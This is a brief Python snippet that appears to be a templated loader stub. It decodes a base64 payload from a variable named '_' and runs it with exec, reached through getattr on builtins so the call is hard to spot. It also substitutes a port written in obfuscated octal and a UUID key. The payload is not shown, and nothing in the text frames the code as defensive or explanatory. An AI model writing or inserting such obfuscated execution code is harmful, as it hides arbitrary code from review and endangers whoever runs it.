import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "913940e4-7aa7-49eb-9e40-79e2d5d7daac")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)